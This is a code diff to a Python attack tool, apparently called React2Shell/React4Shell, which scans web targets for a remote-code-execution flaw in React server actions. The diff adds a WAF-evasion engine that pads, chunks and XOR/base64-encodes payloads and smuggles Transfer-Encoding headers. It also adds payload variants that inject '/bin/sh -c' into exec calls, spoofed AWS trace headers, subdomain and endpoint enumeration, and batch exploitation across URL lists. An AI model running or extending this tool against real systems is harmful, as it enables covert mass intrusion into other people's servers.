@@ -18,10 +18,18 @@ import re
 import argparse
 import readline
 import base64
+import logging
 
 # COMPLETELY DISABLE ALL SSL WARNINGS
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="[%(asctime)s] %(levelname)s %(message)s",
+    datefmt="%H:%M:%S",
+)
+logger = logging.getLogger("react2shell")
 
 # WAF BYPASS PAYLOADS
 PAYLOADS = [
@@ -201,15 +209,83 @@ signal.signal(signal.SIGINT, signal_handler)
 
 def get_random_headers():
     """Generate random headers for each request"""
-    return {
+    headers = {
         "User-Agent": random.choice(USER_AGENTS),
         "Content-Type": random.choice(["application/json", "application/json; charset=utf-8", "text/json"]),
         "Accept": "application/json, text/plain, */*",
         "X-Forwarded-For": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
         "Accept-Encoding": "gzip, deflate",
         "Connection": "keep-alive",
-        "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
+        "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
     }
+
+    # Fingerprint obfuscation: random casing + decoy headers
+    if random.random() < 0.5:
+        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.getrandbits(64):x}"  # mimic AWS traces
+    if random.random() < 0.4:
+        headers["X-Forwarded-Proto"] = random.choice(["http", "https"])
+    return headers
+
+
+def log_event(level, message, **context):
+    extra = " ".join(f"{k}={v}" for k, v in context.items()) if context else ""
+    logger.log(level, f"{message} {extra}".strip())
+
+
+class WAFEvasionEngine:
+    def __init__(self):
+        self.junk_cache = {}
+
+    def _junk(self, size):
+        if size not in self.junk_cache:
+            self.junk_cache[size] = os.urandom(size).hex()
+        return self.junk_cache[size]
+
+    def mutate_body(self, body, technique="pad"):
+        if technique == "pad":
+            return self._junk(2048) + body
+        if technique == "chunk":
+            return "\r\n".join([body[i:i+50] for i in range(0, len(body), 50)])
+        if technique == "xor":
+            b = body.encode()
+            mask = random.randint(1, 255)
+            return base64.b64encode(bytes([c ^ mask for c in b])).decode()
+        return body
+
+    def mutate_headers(self, headers):
+        mutated = headers.copy()
+        mutated.setdefault("X-Request-Random", hashlib.sha1(os.urandom(8)).hexdigest())
+        if random.random() < 0.3:
+            mutated["Transfer-Encoding"] = "chunked"
+        if random.random() < 0.4:
+            mutated["TE"] = random.choice(["trailers", "deflate"])
+        return mutated
+
+    def apply(self, body, headers):
+        technique = random.choice(["pad", "chunk", "xor"])
+        return self.mutate_body(body, technique), self.mutate_headers(headers)
+
+
+waf_engine = WAFEvasionEngine()
+
+
+def generate_payload_variants(payload):
+    variants = [payload]
+    variants.append(payload.replace('exec(\"', 'exec(\"/bin/sh -c '))
+    variants.append(payload.replace('\"}\"}', '\"\"}\"}'))
+    variants.append(base64.b64encode(payload.encode()).decode())
+    return variants
+
+
+def protocol_hopper(url):
+    parsed = urllib.parse.urlparse(url)
+    if not parsed.scheme:
+        return ["http://" + url, "https://" + url]
+    if parsed.scheme == "http":
+        return [url, urllib.parse.urlunparse(parsed._replace(scheme="https"))]
+    if parsed.scheme == "https":
+        return [url, urllib.parse.urlunparse(parsed._replace(scheme="http"))]
+    return [url]
 
 def create_stealth_session():
     """Create a session with stealth capabilities"""
@@ -227,6 +303,79 @@ def apply_stealth_delay():
     if random.random() < 0.7:  # 70% chance of delay
         delay = random.uniform(0.1, 1.5)
         time.sleep(delay)
+
+
+def parse_sitemap(target_url):
+    urls = []
+    try:
+        resp = requests.get(urllib.parse.urljoin(target_url, "/sitemap.xml"), timeout=4, verify=False)
+        if resp.status_code == 200 and "<urlset" in resp.text:
+            for loc in re.findall(r"<loc>([^<]+)</loc>", resp.text):
+                urls.append(loc.strip())
+    except Exception:
+        pass
+    return urls
+
+
+def analyze_js_endpoints(target_url):
+    endpoints = []
+    try:
+        resp = requests.get(target_url, timeout=4, verify=False)
+        if resp.status_code == 200:
+            script_paths = re.findall(r"<script[^>]+src=\"([^\"]+)\"", resp.text)
+            for path in script_paths[:8]:  # limit fetches
+                try:
+                    js_resp = requests.get(urllib.parse.urljoin(target_url, path), timeout=4, verify=False)
+                    matches = re.findall(r"fetch\(['\"]([^'\"]+)", js_resp.text)
+                    endpoints.extend(matches)
+                except Exception:
+                    continue
+            inline_calls = re.findall(r"fetch\(['\"]([^'\"]+)", resp.text)
+            endpoints.extend(inline_calls)
+    except Exception:
+        pass
+    return list({urllib.parse.urlparse(e).path for e in endpoints if e.startswith(("/", "http"))})
+
+
+def enumerate_subdomains(target_url):
+    prefixes = ["api", "dev", "staging", "test", "beta"]
+    discovered = []
+    hostname = urllib.parse.urlparse(target_url).hostname or target_url
+    for prefix in prefixes:
+        candidate = f"{prefix}.{hostname}"
+        for variant in protocol_hopper(candidate):
+            try:
+                resp = requests.head(variant, timeout=2, verify=False, allow_redirects=True)
+                if resp.status_code < 500:
+                    discovered.append(variant)
+            except Exception:
+                continue
+    return list(set(discovered))
+
+
+def tech_fingerprint(target_url):
+    try:
+        resp = requests.get(target_url, timeout=4, verify=False)
+        text = resp.text.lower()
+        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
+        fingerprints = []
+        for marker in ["next.js", "react", "spring", "graphql", "apollo", "vercel", "express"]:
+            if marker in text or any(marker in v for v in hdrs.values()):
+                fingerprints.append(marker)
+        if fingerprints:
+            log_event(logging.INFO, "Tech fingerprint", target=target_url, markers=",".join(sorted(set(fingerprints))))
+        return fingerprints
+    except Exception:
+        return []
+
+
+def discover_endpoints(target_url):
+    endpoints = set(ENDPOINTS + CVE_ENDPOINTS)
+    for url in parse_sitemap(target_url):
+        endpoints.add(urllib.parse.urlparse(url).path)
+    for js_path in analyze_js_endpoints(target_url):
+        endpoints.add(js_path)
+    return list(endpoints)
 
 # ----------------------
 # React2Shell helpers
@@ -272,6 +421,7 @@ def scan_react2shell(target_url, padding_kb=128):
     results = []
     session = create_stealth_session()
     base_url = urllib.parse.urljoin(target_url.rstrip('/') + '/', '')
+    log_event(logging.INFO, "React2Shell probe start", target=base_url)
 
     scenarios = [
         {"name": "standard", "safe": False, "vercel": False},
@@ -291,10 +441,12 @@ def scan_react2shell(target_url, padding_kb=128):
 
         headers = get_random_headers()
         headers.update(extra_headers)
+        body, headers = waf_engine.apply(body, headers)
 
         try:
             resp = session.post(base_url, data=body, headers=headers, timeout=8)
-        except Exception:
+        except Exception as exc:
+            log_event(logging.DEBUG, "React2Shell probe error", error=str(exc))
             continue
 
         redirect_header = resp.headers.get("X-Action-Redirect", "")
@@ -323,6 +475,7 @@ def scan_react2shell(target_url, padding_kb=128):
                 'method': 'POST',
                 'framework': 'React2Shell',
             })
+            log_event(logging.INFO, "React2Shell detection", status=vuln_status, evidence=evidence)
 
     return results
 
@@ -621,14 +774,20 @@ def check_react4shell(target_url):
     if interrupted:
         return []
 
-    react2_results = scan_react2shell(target_url)
-    
+    log_event(logging.INFO, "Fingerprinting target", target=target_url)
+    tech_fingerprint(target_url)
+    discovered_subs = enumerate_subdomains(target_url)
+    targets_to_probe = [target_url] + discovered_subs
+    react2_results = []
+    for base in targets_to_probe:
+        react2_results.extend(scan_react2shell(base))
+
     # Initial probe payload
     probe_payload = '{"query": "test", "variables": null}'
-    
+
     # Combine all endpoints
-    all_endpoints = list(set(ENDPOINTS + CVE_ENDPOINTS))
-    
+    all_endpoints = list(set(discover_endpoints(target_url)))
+
     for endpoint in all_endpoints:
         if interrupted:
             return []
@@ -697,7 +856,11 @@ def check_react4shell(target_url):
                     header_match):
                     
                     # Test each WAF bypass payload
-                    for payload_index, payload in enumerate(PAYLOADS):
+                    base_candidates = []
+                    for base_payload in PAYLOADS:
+                        base_candidates.extend(generate_payload_variants(base_payload))
+
+                    for payload_index, payload in enumerate(base_candidates):
                         if interrupted:
                             return []
                         
@@ -727,7 +890,8 @@ def check_react4shell(target_url):
                         # Apply stealth delay between payload attempts
                         apply_stealth_delay()
                         
-                        test_resp = session.post(url, data=current_payload, headers=test_headers)
+                        mutated_body, mutated_headers = waf_engine.apply(current_payload, test_headers)
+                        test_resp = session.post(url, data=mutated_body, headers=mutated_headers)
                         
                         # Check for successful exploitation indicators
                         if test_resp.status_code in [200, 400, 500]:
@@ -1830,12 +1994,16 @@ def main_scan_mode(input_file, output_prefix, threads=None):
     # Read URLs
     try:
         with open(input_file, 'r') as f:
-            urls = [line.strip() for line in f if line.strip()]
+            raw_urls = [line.strip() for line in f if line.strip()]
+            urls = []
+            for raw in raw_urls:
+                urls.extend(protocol_hopper(raw))
     except:
         print(f"[!] Could not read file: {input_file}")
         sys.exit(1)
     
-    print(f"[*] Ultimate Scanner Started")
+    print(f"[*] Ultimate React4Shell Scanner Started")
+    print(f"[*] React2Shell multipart probes: Enabled")
     # Use thread pool with configurable worker count
     default_workers = max(2, min(os.cpu_count() or 4, 16))
     max_workers = threads if threads else default_workers
